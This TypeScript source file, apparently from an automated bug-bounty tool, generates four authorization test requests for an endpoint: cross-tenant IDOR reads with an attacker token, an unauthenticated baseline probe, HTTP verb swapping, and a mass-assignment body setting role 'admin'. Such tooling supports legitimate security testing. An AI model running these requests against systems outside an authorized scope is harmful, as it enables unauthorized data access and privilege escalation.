import { 
  DiscoveredEndpoint, 
  DualSessionContext, 
  ExploitCandidate, 
  HttpMethod, 
  TargetScope 
} from '../types.js';
import { SafetyGovernor } from '../governor/safety_governor.js';

export interface MatrixStageResult {
  stageName: string;
  candidate: ExploitCandidate;
  purpose: string;
}

/**
 * HADDIX MULTI-STAGE ATTACK MATRIX
 * Direct implementation of Jason Haddix's DEF CON 34 Hackbot Methodology.
 * Systematically tests an endpoint across 4 distinct authorization axes:
 * 1. Two-Sided Cross-Tenant IDOR
 * 2. Public Resource Unauthenticated Baseline Guard (Refutes fake bounties)
 * 3. HTTP Verb Tampering / Method Swapping (GET <-> POST/PUT)
 * 4. Mass Assignment Attribute Injection (Privilege Escalation)
 */
export class HaddixMatrix {
  /**
   * Generates the complete 4-stage testing candidates for a given target endpoint.
   */
  public static generateMatrix(
    endpoint: DiscoveredEndpoint,
    baseUrl: string,
    context: DualSessionContext,
    scope: TargetScope
  ): MatrixStageResult[] {
    const results: MatrixStageResult[] = [];
    const normalizedBase = baseUrl.endsWith('/') ? baseUrl.slice(0, -1) : baseUrl;

    // Resolve resource ID in path
    let targetPath = endpoint.path;
    if (targetPath.includes('{id}') || targetPath.includes(':id') || targetPath.includes('{userId}')) {
      targetPath = targetPath
        .replace('{id}', context.victimResourceId)
        .replace(':id', context.victimResourceId)
        .replace('{userId}', context.victimResourceId);
    } else if (!targetPath.match(/\/\d+/) && !targetPath.match(/[0-9a-f-]{36}/)) {
      // Append resource ID if it's an object collection
      if (endpoint.path.endsWith('/profile') || endpoint.path.endsWith('/invoices') || endpoint.path.endsWith('/account')) {
        targetPath = `${endpoint.path}/${context.victimResourceId}`;
      }
    }

    const fullUrl = `${normalizedBase}${targetPath.startsWith('/') ? targetPath : '/' + targetPath}`;

    // STAGE 1: Cross-Tenant IDOR (User B Attacker Token accessing User A Victim Data)
    const stage1Candidate: ExploitCandidate = {
      vector: 'IDOR_READ_VIOLATION',
      targetUrl: fullUrl,
      method: endpoint.method,
      headers: {
        'Authorization': `Bearer ${context.attackerToken}`,
        'Accept': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      },
      baselineHeaders: {
        'Authorization': `Bearer ${context.victimToken}`,
        'Accept': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      },
      expectedLeakFragment: context.victimSecretIdentifier,
    };
    results.push({
      stageName: 'Stage 1: Cross-Tenant IDOR',
      candidate: stage1Candidate,
      purpose: 'Verifies whether User B can extract User A private tenant data.',
    });

    // STAGE 2: Public Resource Guard (Unauthenticated Probe)
    // If an unauthenticated probe returns identical data as User A, this endpoint is public (NOT an IDOR)
    const stage2Candidate: ExploitCandidate = {
      vector: 'IDOR_READ_VIOLATION',
      targetUrl: fullUrl,
      method: endpoint.method,
      headers: {
        'Accept': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      },
      baselineHeaders: {
        'Authorization': `Bearer ${context.victimToken}`,
        'Accept': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      },
      expectedLeakFragment: context.victimSecretIdentifier,
    };
    results.push({
      stageName: 'Stage 2: Public Resource Guard',
      candidate: stage2Candidate,
      purpose: 'Verifies whether resource is genuinely protected or accidentally public.',
    });

    // STAGE 3: Verb Tampering / Method Swapping
    // Swap GET -> POST, or POST -> GET/PUT to test loose auth middleware
    const alternateMethod: HttpMethod = endpoint.method === 'GET' ? 'POST' : 'GET';
    const stage3Candidate: ExploitCandidate = {
      vector: 'IDOR_MUTATE_VIOLATION',
      targetUrl: fullUrl,
      method: alternateMethod,
      headers: {
        'Authorization': `Bearer ${context.attackerToken}`,
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      },
      body: alternateMethod === 'POST' ? JSON.stringify({ id: context.victimResourceId, action: 'read' }) : undefined,
      baselineHeaders: {
        'Authorization': `Bearer ${context.victimToken}`,
        'Accept': 'application/json',
      },
      expectedLeakFragment: context.victimSecretIdentifier,
    };
    results.push({
      stageName: `Stage 3: Verb Tampering (${endpoint.method} -> ${alternateMethod})`,
      candidate: stage3Candidate,
      purpose: `Tests for HTTP verb confusion and unauthenticated ${alternateMethod} overrides.`,
    });

    // STAGE 4: Mass Assignment Privilege Escalation
    // Inject privileged attributes (admin, is_verified, organization_id)
    const stage4Candidate: ExploitCandidate = {
      vector: 'MASS_ASSIGNMENT_VIOLATION',
      targetUrl: fullUrl,
      method: (endpoint.method === 'GET' ? 'PUT' : endpoint.method) as HttpMethod,
      headers: {
        'Authorization': `Bearer ${context.attackerToken}`,
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      },
      body: JSON.stringify({
        id: context.victimResourceId,
        role: 'admin',
        isAdmin: true,
        is_verified: true,
        tier: 'enterprise',
      }),
      expectedLeakFragment: '"role":"admin"',
    };
    results.push({
      stageName: 'Stage 4: Mass Assignment Injection',
      candidate: stage4Candidate,
      purpose: 'Tests backend model binding for unauthorized privilege escalation.',
    });

    return results;
  }
}
